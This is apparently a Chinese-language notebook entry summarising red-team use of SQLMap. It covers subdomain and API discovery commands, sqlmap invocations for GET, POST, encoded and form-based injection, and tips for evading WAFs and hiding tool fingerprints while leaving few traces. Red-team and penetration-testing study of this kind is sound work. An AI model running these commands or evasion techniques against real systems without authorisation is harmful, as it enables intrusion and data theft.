---
title: SQLMap 红队实战用法
type: tool
tags: [SQLMap, SQL注入, 红队, 工具, 绕过WAF, 信息收集]
public: true
created: 2026-06-16
updated: 2026-06-16
source: 老A搞安全《记录红队实战中SQLMap的真实用法》
---

# SQLMap 红队实战用法

> 红队场景下 SQLMap 的真实用法、踩坑、绕过姿势。不是参数手册，是打法总结。

## 核心前置理念

SQL 注入点绝大多数不在主站，集中在防护薄弱的边缘资产：

- 子域名站点
- 测试/灰度环境
- API 网关接口
- 历史遗留老版本接口

**核心原则**：不直接扫主站，先做全面信息收集，定位薄弱资产后再上 SQLMap。

## 前置信息收集

| 工具 | 命令 | 作用 |
|------|------|------|
| subfinder + httpx | `subfinder -d target.com \| httpx -silent` | 子域名枚举 + 存活探测 |
| grep 提取 API | `grep -Eo "(http\|https)://[a-zA-Z0-9./?=_-]*" all.js` | 从 JS 提取隐藏 API |
| ffuf 路径 Fuzz | `ffuf -u "https://target.com/api/FUZZ" -w api.txt` | 爆破未公开 API |

## 上 SQLMap 前必做三件事

1. **确认 WAF** — 手动加 `'` 看返回码/拦截页面
2. **确认数据库类型** — 看报错信息、延时注入特征
3. **确认数据库权限** — `UNION SELECT @@version` 等语句试探

## 三大实战场景

### 场景 1：无 WAF GET 注入

```bash
sqlmap -u "http://target/api?id=123" \
  --batch --random-agent --threads=10 --level=3
```

### 场景 2：POST 表单注入

```bash
# 用 Burp 抓包保存为 1.txt，自动携带 Cookie/Session/Header
sqlmap -r 1.txt --batch --level=3
```

> `-r` 优于 `--data`：自动携带所有请求头，还原度高，更难被 WAF 识别。

### 场景 3：带加密参数的盲注

```bash
# Base64 编码参数
sqlmap -u "http://target/api?id=MQ==" --tamper=base64encode --batch

# 自定义加密（RSA/AES）
sqlmap -u "http://target/api?id=1" \
  --eval="import requests; id = encrypt('1')"
```

## 高阶技巧

### 1. 消除工具指纹

| 方式 | 隐蔽度 |
|------|--------|
| `--random-agent` | ⭐⭐ |
| `--user-agent="Mozilla/5.0..."` | ⭐⭐⭐ |
| `-r` 加载真实浏览器抓包 | ⭐⭐⭐⭐⭐ (最优) |

### 2. 线程与限速

| 环境 | 配置 |
|------|------|
| 无 WAF | `--threads=10 --batch` |
| 有 WAF | `--threads=1 --delay=2 --batch` |

### 3. 批量检测表单

```bash
sqlmap -u "http://target/login.html" --forms --batch
```

### 4. 锁定指定参数

```bash
sqlmap -u "http://target?id=1&page=2&sort=asc" -p id --batch
```

## 红队心法

1. 工具人人会用，差距在时机判断、组合搭配、收尾清理
2. 优先打边缘资产，不硬刚主站防护
3. 先人工判断环境，再上工具，避免无效暴露
4. 红队目标：拿到数据、进入内网、留下最少痕迹
